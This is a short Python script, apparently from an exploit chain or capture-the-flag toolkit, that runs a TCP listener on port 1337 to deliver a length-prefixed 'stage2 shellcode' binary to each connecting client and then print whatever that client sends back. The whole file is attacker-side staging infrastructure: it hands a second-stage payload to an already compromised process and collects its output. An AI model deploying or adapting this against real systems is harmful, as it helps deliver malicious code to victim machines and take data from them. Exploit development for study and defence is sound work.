#!/usr/bin/env python3
import socket, argparse, struct, time, sys

def p64(x):
    return struct.pack("<Q", x)

parser = argparse.ArgumentParser(description="simple tcp server to serve stage2 shellcode")
parser.add_argument("bin", help="stage2 binary to send down")
parser.add_argument("port", nargs="?", help="port to listen on (default 1337)", type=int, default=1337)
args = parser.parse_args()

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)

sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(("0", args.port))
sock.listen(7)

while True:
    print("[%s] waiting for connection on port %d"%(time.asctime(),args.port))
    cli, addr = sock.accept()
    print("[%s] got connection from %s:%d"%(time.asctime(),addr[0],addr[1]))
    pl = open(args.bin, "rb").read()
    cli.send(p64(len(pl)))
    cli.sendall(pl)
    while True:
        s = cli.recv(0x1000)
        if len(s) == 0:
            break
        sys.stdout.buffer.write(s)
        sys.stdout.buffer.flush()
    cli.close()
    print("\n[%s] connection closed\n"%time.asctime())
